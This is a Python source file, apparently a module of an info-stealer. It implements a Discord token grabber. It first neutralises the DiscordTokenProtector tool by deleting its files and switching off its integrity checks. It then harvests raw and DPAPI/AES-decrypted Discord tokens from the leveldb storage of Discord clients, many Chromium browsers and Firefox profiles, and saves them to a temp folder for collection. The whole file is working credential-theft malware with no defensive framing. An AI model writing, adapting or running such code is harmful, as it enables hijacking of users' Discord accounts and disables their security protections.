import os
import base64
import json
import re
import time
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

class Discord:
    def __init__(self, temp_path):
        self.temp_path = temp_path
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens = []
        self.ids = []
        self.killprotector()
        self.grabTokens()
        self.save_tokens()

    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = os.path.join(path, "config.json")
        if not os.path.exists(path):
            return
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(os.path.join(path, process))
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, "r", errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
            item.update({
                'auto_start': False, 'auto_start_discord': False, 'integrity': False,
                'integrity_allowbetterdiscord': False, 'integrity_checkexecutable': False,
                'integrity_checkhash': False, 'integrity_checkmodule': False,
                'integrity_checkscripts': False, 'integrity_checkresource': False,
                'integrity_redownloadhashes': False, 'iterations_iv': 364,
                'iterations_key': 457, 'version': 69420
            })
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            print("Neutralized DiscordTokenProtector")

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt"

    def get_master_key(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Master key fetch failed: {e}")
            return None

    def grabTokens(self):

        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path and os.path.exists(os.path.join(self.roaming, f"{disc}\\Local State")):
                master_key = self.get_master_key(os.path.join(self.roaming, f"{disc}\\Local State"))
                if not master_key:
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    try:
                        with open(os.path.join(path, file_name), "r", errors='ignore') as f:
                            for line in f.readlines():
                                line = line.strip()
                                if not line:
                                    continue
                                for y in re.findall(self.encrypted_regex, line):
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), master_key)
                                    if token and token not in self.tokens:
                                        self.tokens.append(token)
                                        self.ids.append(f"Decrypted from {name}")
                    except Exception as e:
                        print(f"Error reading {name} token file: {e}")
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    try:
                        with open(os.path.join(path, file_name), "r", errors='ignore') as f:
                            for line in f.readlines():
                                line = line.strip()
                                if not line:
                                    continue
                                for token in re.findall(self.regex, line):
                                    if token not in self.tokens:
                                        self.tokens.append(token)
                                        self.ids.append(f"Raw from {name}")
                    except Exception as e:
                        print(f"Error reading {name} token file: {e}")

        firefox_path = os.path.join(self.roaming, "Mozilla\\Firefox\\Profiles")
        if os.path.exists(firefox_path):
            for path, _, files in os.walk(firefox_path):
                for file in files:
                    if not file.endswith('.sqlite'):
                        continue
                    try:
                        with open(os.path.join(path, file), "r", errors='ignore') as f:
                            for line in f.readlines():
                                line = line.strip()
                                if not line:
                                    continue
                                for token in re.findall(self.regex, line):
                                    if token not in self.tokens:
                                        self.tokens.append(token)
                                        self.ids.append("Firefox")
                    except Exception as e:
                        print(f"Error reading Firefox token file: {e}")

    def save_tokens(self):

        os.makedirs(os.path.join(self.temp_path, "Discord"), exist_ok=True)
        if self.tokens:
            with open(os.path.join(self.temp_path, "Discord", "tokens.txt"), "w", encoding="utf-8") as f:
                f.write(f"Timestamp: {time.ctime()}\nTotal Tokens Found: {len(self.tokens)}\n\n")
                for token, source in zip(self.tokens, self.ids):
                    f.write(f"Source: {source}\nToken: {token}\n\n")
            print(f"Saved {len(self.tokens)} Discord tokens")
        else:
            with open(os.path.join(self.temp_path, "Discord", "No Tokens Found.txt"), "w") as f:
                f.write(f"Timestamp: {time.ctime()}\nNo Discord tokens found.")
            print("No Discord tokens saved")